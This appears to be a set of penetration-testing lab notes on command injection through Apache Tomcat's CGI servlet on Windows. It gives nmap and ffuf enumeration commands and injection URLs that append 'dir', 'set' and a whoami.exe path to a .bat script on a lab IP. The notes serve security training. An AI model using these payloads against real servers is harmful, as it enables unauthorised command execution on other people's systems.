* CGI serverlet is a vital component of Apache Tomct that enables web servers to communicate with external applications.
* Middleware between web servers and external information resources. 
* They support execution of external applications that conform to the CGI specification

|**Advantages**|**Disadvantages**|
|---|---|
|It is simple and effective for generating dynamic web content.|Incurs overhead by having to load programs into memory for each request.|
|Use any programming language that can read from standard input and write to standard output.|Cannot easily cache data in memory between page requests.|
|Can reuse existing code and avoid writing new code.|It reduces the server's performance and consumes a lot of processing time.|

* In tomcat the `enableCmdLineArgument` setting for Tomcats CGI Servlet Controls whether command line arguments are created from the query string. 
* Example CGI URL:
```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```
* Action Paramter is set to title 
* query parameter is the search term
```http
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```
* When `enableCmdLineArguments` is enabled on Windows systems the CGI servlet fails to validate the input from the web browser. 
* Example exploit:
```HTTP
http://example.com/cgi-bin/hello.bat?&dir
```
## Enumeration
* Look for tomcat running
```shell
nmap -p- -sC -Pn 10.129.204.227 --open 
```
* Find a CGI script. 
.cmd
```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
.bat
```shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

## Exploitation
Not all commands will work
```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
Retrieve environmental variables
```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
If the path variable is unset:
```http
PATH_INFO=
```
You will need to manually specify the path
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
If this sill fails try URL encoding:
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```